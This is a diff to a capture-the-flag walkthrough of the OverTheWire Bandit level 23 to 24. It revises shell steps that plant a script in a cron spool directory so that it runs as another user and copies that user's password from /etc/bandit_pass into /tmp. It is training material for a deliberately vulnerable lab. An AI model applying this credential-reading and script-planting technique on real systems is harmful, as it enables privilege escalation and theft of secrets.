@@ -35,16 +35,12 @@ do
 done
 ```
 
-Create shell script somewhere in /tmp:
-
-bandit23@bandit:/tmp/w/wibble$ cat wibble.sh 
-```
+bandit23@bandit:~$ chmod +x /tmp/wibble.sh
+bandit23@bandit:~$ cp /tmp/wibble.sh /var/spool/bandit24/foo/script.sh
+bandit23@bandit:~$ cat /tmp/wibble.sh
 #!/bin/bash
 
-cat /etc/bandit_pass/bandit24 > /tmp/234567890
-```
+cat /etc/bandit_pass/bandit24 > /tmp/wibble2
 
-Then chmod this script to make it executable, then copy it into /var/spool/bandit24/
-
-bandit23@bandit:/tmp/w/wibble$ cat /tmp/234567890
-UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit23@bandit:~$ cat /tmp/wibble2
+<snip>
